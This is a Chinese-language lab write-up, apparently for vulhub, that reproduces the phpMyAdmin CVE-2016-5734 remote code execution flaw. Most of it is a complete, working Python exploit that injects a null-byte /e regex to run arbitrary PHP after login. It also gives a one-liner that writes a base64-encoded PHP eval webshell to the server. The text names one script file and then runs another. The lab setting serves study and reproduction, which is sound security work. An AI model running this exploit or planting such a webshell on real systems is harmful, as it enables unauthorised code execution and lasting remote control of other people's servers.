# PhpMyAdmin 4.0.x-4.6.2远程执行代码漏洞（CVE-2016-5734）

###### by ADummy

### 0x00利用路线

​			exp直接打，kali自带--->连接webshell

### 0x01漏洞介绍			

​			PhpMyAdmin是一个用PHP编写的免费软件工具，旨在处理Web上的MySQL管理。该漏洞在`preg_replace`函数中，因为用户提交的信息可以被拼接到第一个参数中。

在PHP 5.4.7之前，的第一个参数`preg_replace`可以用截断，`\0`并将搜索模式更改为`\e`。它可能会导致远程执行代码漏洞。

##### 影响版本

```
phpmyadmin - 4.0.10.16之前的4.0.x版本
phpmyadmin - 4.4.15.7之前的4.4.x版本
phpmyadmin - 4.6.3之前的4.6.x版本（实际上是因为此版本需要PHP5.5 +，所以无法重现此漏洞）
```

### 0x02漏洞复现

启动后，访问`http://your-ip:8080`，您将看到phpMyAdmin的登录页面。登录有`root`：`root`

此漏洞需要登录和写数据权限。

我们使用此POC（https://www.exploit-db.com/exploits/40185/）重现该漏洞。

```
./cve-2016-5734.py -c 'system(id);' -u root -p root -d test http://your-ip:8080/
```

#### exp

```
#!/usr/bin/env python

"""cve-2016-5734.py: PhpMyAdmin 4.3.0 - 4.6.2 authorized user RCE exploit
Details: Working only at PHP 4.3.0-5.4.6 versions, because of regex break with null byte fixed in PHP 5.4.7.
CVE: CVE-2016-5734
Author: https://twitter.com/iamsecurity
run: ./cve-2016-5734.py -u root --pwd="" http://localhost/pma -c "system('ls -lua');"
"""

import requests
import argparse
import sys

__author__ = "@iamsecurity"

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("url", type=str, help="URL with path to PMA")
    parser.add_argument("-c", "--cmd", type=str, help="PHP command(s) to eval()")
    parser.add_argument("-u", "--user", required=True, type=str, help="Valid PMA user")
    parser.add_argument("-p", "--pwd", required=True, type=str, help="Password for valid PMA user")
    parser.add_argument("-d", "--dbs", type=str, help="Existing database at a server")
    parser.add_argument("-T", "--table", type=str, help="Custom table name for exploit.")
    arguments = parser.parse_args()
    url_to_pma = arguments.url
    uname = arguments.user
    upass = arguments.pwd
    if arguments.dbs:
        db = arguments.dbs
    else:
        db = "test"
    token = False
    custom_table = False
    if arguments.table:
        custom_table = True
        table = arguments.table
    else:
        table = "prgpwn"
    if arguments.cmd:
        payload = arguments.cmd
    else:
        payload = "system('uname -a');"

    size = 32
    s = requests.Session()
    # you can manually add proxy support it's very simple ;)
    # s.proxies = {'http': "127.0.0.1:8080", 'https': "127.0.0.1:8080"}
    s.verify = False
    sql = '''CREATE TABLE `{0}` (
      `first` varchar(10) CHARACTER SET utf8 NOT NULL
    ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
    INSERT INTO `{0}` (`first`) VALUES (UNHEX('302F6500'));
    '''.format(table)

    # get_token
    resp = s.post(url_to_pma + "/?lang=en", dict(
        pma_username=uname,
        pma_password=upass
    ))
    if resp.status_code is 200:
        token_place = resp.text.find("token=") + 6
        token = resp.text[token_place:token_place + 32]
    if token is False:
        print("Cannot get valid authorization token.")
        sys.exit(1)

    if custom_table is False:
        data = {
            "is_js_confirmed": "0",
            "db": db,
            "token": token,
            "pos": "0",
            "sql_query": sql,
            "sql_delimiter": ";",
            "show_query": "0",
            "fk_checks": "0",
            "SQL": "Go",
            "ajax_request": "true",
            "ajax_page_request": "true",
        }
        resp = s.post(url_to_pma + "/import.php", data, cookies=requests.utils.dict_from_cookiejar(s.cookies))
        if resp.status_code == 200:
            if "success" in resp.json():
                if resp.json()["success"] is False:
                    first = resp.json()["error"][resp.json()["error"].find("<code>")+6:]
                    error = first[:first.find("</code>")]
                    if "already exists" in error:
                        print(error)
                    else:
                        print("ERROR: " + error)
                        sys.exit(1)
    # build exploit
    exploit = {
        "db": db,
        "table": table,
        "token": token,
        "goto": "sql.php",
        "find": "0/e\0",
        "replaceWith": payload,
        "columnIndex": "0",
        "useRegex": "on",
        "submit": "Go",
        "ajax_request": "true"
    }
    resp = s.post(
        url_to_pma + "/tbl_find_replace.php", exploit, cookies=requests.utils.dict_from_cookiejar(s.cookies)
    )
    if resp.status_code == 200:
        result = resp.json()["message"][resp.json()["message"].find("</a>")+8:]
        if len(result):
            print("result: " + result)
            sys.exit(0)
        print(
            "Exploit failed!\n"
            "Try to manually set exploit parameters like --table, --database and --token.\n"
            "Remember that servers with PHP version greater than 5.4.6"
            " is not exploitable, because of warning about null byte in regexp"
        )
        sys.exit(1)
```

![PhpMyAdmin_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/PhpMyAdmin_RCE_1.jpg)

执行exp id被执行

![PhpMyAdmin_RCE_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/PhpMyAdmin_RCE_2.jpg)

```
kali里有自带利用脚本 searchsploit phpmyadmin

48105.py为我们的利用脚本

python3 40185.py -u root --pwd="root" http://192.168.56.111:8080/ -c "file_put_contents('shell.php',base64_decode('PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4='));"
```

进入容器查看，shell.php被成功写入

![PhpMyAdmin_RCE_3](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/PhpMyAdmin_RCE_3.jpg)

蚁剑连接

此处不知道为什么连接不上。

#### 0x03参考资料

这位大佬写的思路很好，强烈推荐

https://blog.csdn.net/nzjdsds/article/details/100142346

